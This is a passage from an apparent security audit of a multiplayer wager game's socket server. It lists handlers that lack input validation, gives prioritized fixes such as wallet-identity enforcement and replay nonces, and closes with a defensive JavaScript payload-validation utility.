| `createWeaponArray` | count, max | **None** | **None** | N/A | No |
| `weaponPick` | arrayIndex | **None** | **None** | N/A | No |
| `shoot` (legacy) | selectedWeapon, power, rotation, etc. | **None** | **None** | N/A | No |
| `terrainPath` | path[], hostPos, playerPos | **None** | **None** | **None** | No |
| `angleChange` | rotation | **None** | **None** | N/A | No |
| `powerChange` | power | **None** | **None** | N/A | No |
| `deleteRoom` | (none) | N/A | N/A | N/A | No (no host check) |
| `leaveRoom` | (none) | N/A | N/A | N/A | No |
| `getShotInfo` | (none) | N/A | N/A | N/A | No |
| `prestigeBurn` | (none) | N/A | N/A | N/A | Checked |
| `giveTurn` | terrainData, pos1, pos2, rotation1, rotation2 | **None** | **None** | **None** | No |

---

## Recommendations Priority Matrix

### Immediate (Pre-Launch Blockers)

1. **Add input validation middleware** for all socket events. Create a `validatePayload(schema, data)` utility that checks types, bounds, and required fields. Apply it to every handler.

2. **Enforce authenticated wallet identity** for wager-related actions. Remove `walletAddress` from `createRoom` and `joinRoom` payloads; use only `authenticatedWallets[client.id]`.

3. **Sanitize player names**: max 24 chars, alphanumeric + basic punctuation only, HTML-entity-encode before broadcast.

4. **Validate `fire` parameters**: type-check all fields, bounds-check power (0-100) and angle (0-2*PI), use server-stored tank positions instead of client-supplied startX/startY.

5. **Add inventory check to `fire` handler**: verify the player owns the weapon they are attempting to fire.

6. **Add null/undefined guards** to all destructured payloads to prevent uncaught TypeErrors.

### Short-Term (Before Wager Launch)

7. **Replace `atob()` with `Buffer.from()`** in auth.js for Node.js-native Base64 decoding.

8. **Add host-only guard to `deleteRoom`**.

9. **Validate roomId format** with regex before any processing.

10. **Validate color as integer** in range 0x000000-0xFFFFFF.

11. **Add nonce to auth messages** to prevent replay attacks.

12. **Add MongoDB schema validators** for maxlength on username fields.

### Long-Term (Architecture)

13. **Remove legacy unvalidated relay handlers** (`shoot`, `terrainPath`, `createWeaponArray`, `giveTurn`) once all clients use server-authoritative events.

14. **Use `Map` objects** instead of plain objects for dynamic state stores to prevent prototype-related issues.

15. **Implement a JSON schema validation library** (e.g., `ajv` or `zod`) for declarative payload validation across all socket events.

---

## Appendix: Validation Utility Reference Implementation

```javascript
// Suggested validation utility for socket event payloads

function isString(v) { return typeof v === 'string'; }
function isNumber(v) { return typeof v === 'number' && !isNaN(v) && isFinite(v); }
function isInteger(v) { return isNumber(v) && Number.isInteger(v); }

function validatePlayerName(name) {
    if (!isString(name)) return { valid: false, reason: 'Name must be a string' };
    if (name.length < 1 || name.length > 24) return { valid: false, reason: 'Name must be 1-24 characters' };
    if (!/^[a-zA-Z0-9_ -]+$/.test(name)) return { valid: false, reason: 'Name contains invalid characters' };
    return { valid: true, sanitized: name.trim() };
}

function validateColor(color) {
    if (!isInteger(color)) return { valid: false, reason: 'Color must be an integer' };
    if (color < 0 || color > 0xFFFFFF) return { valid: false, reason: 'Color out of range' };
    return { valid: true };
}

function validateWalletAddress(address) {
    if (!isString(address)) return { valid: false, reason: 'Wallet must be a string' };
    if (address.length < 32 || address.length > 44) return { valid: false, reason: 'Invalid wallet length' };
    if (!/^[1-9A-HJ-NP-Za-km-z]+$/.test(address)) return { valid: false, reason: 'Invalid Base58 characters' };
    return { valid: true };
}

function validateFirePayload(data) {
    if (!data || typeof data !== 'object') return { valid: false, reason: 'Invalid payload' };
    if (!isNumber(data.angle) || data.angle < 0 || data.angle > Math.PI * 2) return { valid: false, reason: 'Invalid angle' };
    if (!isNumber(data.power) || data.power < 0 || data.power > 100) return { valid: false, reason: 'Invalid power' };
    if (!isInteger(data.weaponId) || data.weaponId < 0) return { valid: false, reason: 'Invalid weaponId' };
    return { valid: true };
}
```
